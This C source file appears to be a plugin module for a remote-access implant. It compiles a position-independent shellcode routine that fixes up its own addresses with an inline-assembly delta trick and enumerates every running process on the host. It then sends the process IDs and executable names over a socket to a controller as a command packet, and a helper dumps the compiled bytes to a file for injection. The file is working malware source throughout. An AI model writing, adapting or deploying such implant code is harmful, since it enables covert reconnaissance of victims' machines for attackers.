#include "global_data.h"
#include "shellcodes.h"

extern void __cdecl process_entry(global_data_t *global_data);
extern int __cdecl process_send_list(global_data_t *global_data, SOCKET s);
extern void __cdecl process_code_end();

#define FIX(name) xprocess.##name = (_##name)(delta + (char *)name)

#pragma optimize("ts", on)

void __cdecl process_entry(global_data_t *global_data) {
  uint32_t delta;

  __asm {
    call x;
  x:
    pop	eax;
    sub	eax, offset x;
    mov	delta, eax
  }

  FIX(process_send_list);
}

#undef FIX  // undef macro FIX

int __cdecl process_send_list(global_data_t *global_data, SOCKET s) {
  HANDLE snapshot = xCreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);

  PROCESSENTRY32W pe;
  pe.dwSize = sizeof(pe);

  xProcess32FirstW(snapshot, &pe);

  buffer_t *buf = xbuffer_new();

  while (xProcess32NextW(snapshot, &pe)) {
    mlp_array_size(buf, 2);
    {
      mlp_unsigned(buf, pe.th32ProcessID);
      mlp_widestr(buf, pe.szExeFile);
    }
  }

  xCloseHandle(snapshot);

  int ret = xsend_packet(s, CMD_PROCESS_LIST, (const char *)buf->data, buf->size);

  xbuffer_free(buf);

  return ret;
}

void __cdecl process_code_end() {
  printf(__FUNCTION__);
}

#pragma optimize("ts", off)

#undef FIX             // undef macro FIX

void process_save(char *filename) {
  char *start, *end;
  FILE *f;

  start = (char *)process_entry;
  end = (char *)process_code_end;

  printf("[*] process code size = 0x%X\n", end - start);

  f = fopen(filename, "wb");
  fwrite(start, 1, end - start, f);

  fclose(f);
  printf("[*] save process to %s success.\n", filename);
}